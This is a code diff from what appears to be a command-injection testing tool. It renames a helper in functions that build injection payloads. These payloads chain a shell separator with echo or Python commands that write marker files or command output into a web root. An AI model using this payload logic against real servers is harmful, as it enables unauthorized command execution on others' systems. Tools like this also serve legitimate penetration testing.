@@ -46,7 +46,7 @@ def decision(separator, TAG, OUTPUT_TEXTFILE):
               "echo " + TAG + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -59,7 +59,7 @@ def decision_combined(separator, tags, OUTPUT_TEXTFILE):
     operator = settings.FILE_WRITE_OPERATOR if index == 0 else settings.FILE_APPEND_OPERATOR
     writes.append("echo " + tag + operator + settings.WEB_ROOT + OUTPUT_TEXTFILE)
   payload = separator + separator.join(writes)
-  payload = checks.append_custom_marker(payload, separator)
+  payload = checks.terminate_payload(payload, separator)
   return payload
 
 """
@@ -79,7 +79,7 @@ def decision_alter_interpreter(separator, TAG, OUTPUT_TEXTFILE):
               settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\nf.write('" + TAG + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
                )
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   payload = checks.fix_newlines_for_headers(payload, separator)
 
@@ -94,7 +94,7 @@ def decision_combined_alter_interpreter(separator, tags, OUTPUT_TEXTFILE):
             settings.CMD_SUB_PREFIX + settings.LINUX_PYTHON_INTERPRETER + " -c \"f=open('" + settings.WEB_ROOT + OUTPUT_TEXTFILE + "','w')\n" + writes + "f.close()\n\"" + settings.CMD_SUB_SUFFIX
              )
 
-  payload = checks.append_custom_marker(payload, separator)
+  payload = checks.terminate_payload(payload, separator)
 
   payload = checks.fix_newlines_for_headers(payload, separator)
 
@@ -122,7 +122,7 @@ def cmd_execution(separator, cmd, OUTPUT_TEXTFILE):
               cmd + settings.FILE_WRITE_OPERATOR + settings.WEB_ROOT + OUTPUT_TEXTFILE
               )
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   return payload
 
@@ -150,7 +150,7 @@ def cmd_execution_alter_interpreter(separator, cmd, OUTPUT_TEXTFILE):
               settings.CMD_SUB_PREFIX + "echo " + cmd_exec + settings.CMD_SUB_SUFFIX + "')\nf.close()\n\"" + settings.CMD_SUB_SUFFIX
               )
 
-    payload = checks.append_custom_marker(payload, separator)
+    payload = checks.terminate_payload(payload, separator)
 
   payload = checks.fix_newlines_for_headers(payload, separator)
 
